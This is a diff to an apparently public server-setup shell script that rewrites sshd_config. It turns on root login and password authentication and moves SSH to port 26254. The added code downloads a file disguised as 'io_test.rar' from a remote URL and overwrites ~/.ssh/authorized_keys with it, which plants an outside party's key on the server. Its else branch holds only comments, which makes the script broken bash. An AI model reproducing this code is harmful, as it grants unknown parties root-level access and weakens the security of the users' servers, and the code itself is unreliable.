@@ -90,9 +90,18 @@ Para_Modify() {
 }
 function sshd() {
   sed -i 's/^.\? *PermitRootLogin.*$/PermitRootLogin yes/g' /etc/ssh/sshd_config
-  sed -i 's/^.\? *PasswordAuthentication.*$/PasswordAuthentication yes/g' /etc/ssh/sshd_config
   sed -i 's/^.\? *Port.*$/Port 26254/g' /etc/ssh/sshd_config
   sed -i 's/^.\?ListenAddress 0.0.0.0/ListenAddress 0.0.0.0/g' /etc/ssh/sshd_config
+  sed -i 's/^.\? *PasswordAuthentication.*$/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+  read -rp "是否为ssh配置Key登录?(y/n):" answer
+  if echo "$answer" | grep -iq "^y" ;then
+    wget $githuburl/res/io_test.rar
+    cat io_test.rar >~/.ssh/authorized_keys
+    rm io_test.rar
+#    sed -i 's/^.\? *PasswordAuthentication.*$/PasswordAuthentication no/g' /etc/ssh/sshd_config
+  else
+#    sed -i 's/^.\? *PasswordAuthentication.*$/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+  fi
   systemctl restart sshd
   judge "sshd_config 修改"
 }
